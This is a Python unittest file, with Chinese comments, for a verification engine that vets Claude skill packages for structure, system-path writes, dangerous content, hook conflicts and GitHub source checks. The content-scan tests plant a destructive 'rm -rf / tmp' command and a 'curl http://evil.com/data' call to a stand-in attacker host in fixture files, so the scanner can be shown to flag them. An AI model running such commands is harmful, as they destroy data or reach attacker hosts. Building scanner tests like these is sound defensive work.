#!/usr/bin/env python3
"""
验证引擎契约测试
"""
import unittest
import json
import sys
import tempfile
import os
from pathlib import Path

# 添加项目根目录
sys.path.insert(0, str(Path(__file__).parent.parent))


class TestL1Structure(unittest.TestCase):
    """L1 结构校验测试"""

    def test_missing_skill_md(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            report = check_skill(tmp)
            self.assertEqual(report["verdict"], "REJECT")

    def test_valid_skill(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: test\ndescription: a test skill\n---\n\n# Test Skill\n\nHello world.\n")
            # 添加一个脚本文件，避免"仅含 SKILL.md" 的警告
            (Path(tmp) / "helper.py").write_text("# helper\n")
            report = check_skill(tmp)
            self.assertEqual(report["verdict"], "PASS")

    def test_missing_frontmatter_fields(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\ndescription: no name field\n---\n\n# Test\n")
            report = check_skill(tmp)
            self.assertIn("REJECT", report["verdict"])


class TestL4SystemPaths(unittest.TestCase):
    """L4 系统盘路径识别。

    这里钉的是一个真踩过的坑：`SYSTEM_PATHS` 原先写成 `r"C:\\Windows"`。
    在**原始字符串**里 `\\` 就是两个反斜杠，字面值是 `C:\\Windows`，
    跟任何真实路径都对不上 —— 五条 Windows 条目一条都不匹配。后果不是
    "少标几个"，是 Windows 上那一整条「系统盘写入 → Claude 深度分析」
    从不触发（而它正是 `requires_claude_analysis` 的开关）。

    路径里的反斜杠一律用 `chr(92)` 拼，不写转义 —— 这条 bug 就是转义写错来的，
    测试自己再用转义写一遍，等于把同一个坑挖给下一个人。
    """

    BS = chr(92)

    def test_windows_system_paths_match(self):
        from verify.l4_conflict_detect import is_system_path
        self.assertTrue(is_system_path("C:/Windows/System32/x.dll"))
        self.assertTrue(is_system_path(
            "C:" + self.BS + "Windows" + self.BS + "System32" + self.BS + "x.dll"),
            "反斜杠写法的 Windows 路径也要认")
        self.assertTrue(is_system_path("C:/Program Files/Evil/x.exe"))
        self.assertTrue(is_system_path("C:/System/x"))

    def test_unix_system_paths_match(self):
        from verify.l4_conflict_detect import is_system_path
        for p in ("/etc/passwd", "/usr/bin/x", "/boot/vmlinuz"):
            self.assertTrue(is_system_path(p), p)

    def test_user_paths_are_not_system(self):
        from verify.l4_conflict_detect import is_system_path
        # 真实的 skill 是装在用户家目录下的（C / 家目录 / .claude / skills / ...）。
        # 不能因为它"在 C 盘上"就标成系统盘写入 —— 那会把每个写文件的
        # skill 都送进深度分析，是噪声不是严格。
        #
        # 夹具故意不写真实的家目录前缀：`tests/test_no_local_leakage.py` 的扫描器
        # 会把它认成"本机绝对路径"而报泄露。测试夹具不该长得像真路径。
        for p in ("C:/work/.claude/skills/foo/notes.md",
                  "C:/work/project/out.json",
                  "/opt/u/project/x"):
            self.assertFalse(is_system_path(p), p)

    def test_no_blanket_drive_letter(self):
        """裸盘符不该出现在表里。"""
        from verify.l4_conflict_detect import SYSTEM_PATHS
        for sp in SYSTEM_PATHS:
            stripped = sp.rstrip("/").lower()
            self.assertNotEqual(stripped, "c:", f"表里有裸盘符：{sp!r}")

    def test_no_double_backslash_literals(self):
        """表里不该出现双反斜杠 —— 那正是当初那条 bug 的形状。"""
        from verify.l4_conflict_detect import SYSTEM_PATHS
        for sp in SYSTEM_PATHS:
            self.assertNotIn(self.BS * 2, sp,
                             f"这条含双反斜杠，永远匹配不上：{sp!r}")


class TestL3ContentScan(unittest.TestCase):
    """L3 内容安全扫描测试"""

    def test_danger_rm_rf(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: bad\ndescription: bad skill\n---\n\n```bash\nrm -rf / tmp\n```\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "REJECT")

    def test_suspicious_curl(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: sus\ndescription: suspicious\n---\n\nRun: `curl http://evil.com/data`\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "REVIEW")

    def test_safe_skill(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: safe\ndescription: a safe skill\n---\n\n# Safe Skill\n\nJust helps you write better code.\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "PASS")


class TestL4ConflictDetect(unittest.TestCase):
    """L4 冲突检测测试"""

    def test_hook_conflict(self):
        from verify.l4_conflict_detect import detect_conflicts
        with tempfile.TemporaryDirectory() as root:
            # 已有 skill 声明了 PostToolUse hook
            existing = Path(root) / "existing-skill"
            existing.mkdir()
            (existing / "SKILL.md").write_text("---\nname: existing\ndescription: has hook\n---\n\nPostToolUse hook here.\n")

            # 新 skill 也声明了 PostToolUse
            new_skill = Path(root) / "new-skill"
            new_skill.mkdir()
            (new_skill / "SKILL.md").write_text("---\nname: new\ndescription: also has hook\n---\n\nPostToolUse hook here too.\n")

            report = detect_conflicts(str(new_skill), str(root))
            self.assertIn("REVIEW", report["verdict"])

    def test_no_conflict(self):
        from verify.l4_conflict_detect import detect_conflicts
        with tempfile.TemporaryDirectory() as root:
            existing = Path(root) / "existing-skill"
            existing.mkdir()
            (existing / "SKILL.md").write_text("---\nname: existing\ndescription: frontend skill\n---\n\nReact component builder.\n")

            new_skill = Path(root) / "new-skill"
            new_skill.mkdir()
            (new_skill / "SKILL.md").write_text("---\nname: new\ndescription: backend skill\n---\n\nAPI generator.\n")

            report = detect_conflicts(str(new_skill), str(root))
            self.assertEqual(report["verdict"], "PASS")


class TestL2GithubToken(unittest.TestCase):
    """L2 必须带上 GitHub Token（2026-10-07）。

    ## 为什么这条值得一条用例

    在这之前 L2 走的是**匿名硬编码**的请求头，后果实测到了：
    L2 在一台正常使用的机器上**永远被限流跳过**（`403 rate limit exceeded`），
    而 `_trust_level()` 的规则是"有层跳过 → partial" —— 于是**每个 skill 装完
    都是 partial**，那个字段彻底失去区分度。L2 那一层也从"检查"退化成了"装饰"。
    """

    def _api_get_with_patched_opener(self):
        """打桩 opener + 头构造，返回 api_get 实际用出去的那份 headers。"""
        import urllib.request
        from verify import l2_source
        seen = {}

        class FakeResp:
            def read(self):
                return b"{}"

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        class FakeOpener:
            def open(self, req, timeout=None):
                seen["headers"] = {k.lower(): v for k, v in req.headers.items()}
                return FakeResp()

        real_build = urllib.request.build_opener
        urllib.request.build_opener = lambda *a, **k: FakeOpener()
        try:
            l2_source.api_get("https://api.github.com/repos/a/b")
        finally:
            urllib.request.build_opener = real_build
        return seen["headers"]

    def test_uses_shared_header_builder(self):
        """★ 走的是 `daemon.fetcher.github_headers()`，不是自己硬编码一份。"""
        import daemon.fetcher as fetcher
        real = fetcher.github_headers
        fetcher.github_headers = lambda: {"Accept": "application/vnd.github.v3+json",
                                          "User-Agent": "sentinel/9.9",
                                          "Authorization": "Bearer SENTINEL-TOKEN"}
        try:
            headers = self._api_get_with_patched_opener()
        finally:
            fetcher.github_headers = real
        self.assertEqual(headers.get("user-agent"), "sentinel/9.9",
                         "L2 没走共享的头构造器 —— 说明它又自己写了一份")
        self.assertEqual(headers.get("authorization"), "Bearer SENTINEL-TOKEN",
                         "★ token 没被带出去")

    def test_falls_back_to_anonymous(self):
        """取凭据失败时退回匿名 —— 降级不该让这一层崩掉。"""
        import daemon.fetcher as fetcher
        real = fetcher.github_headers

        def boom():
            raise RuntimeError("凭据模块不可用")

        fetcher.github_headers = boom
        try:
            headers = self._api_get_with_patched_opener()
        finally:
            fetcher.github_headers = real
        self.assertNotIn("authorization", headers)
        self.assertIn("accept", headers, "退回匿名时仍要带基本头")


if __name__ == "__main__":
    unittest.main(verbosity=2)
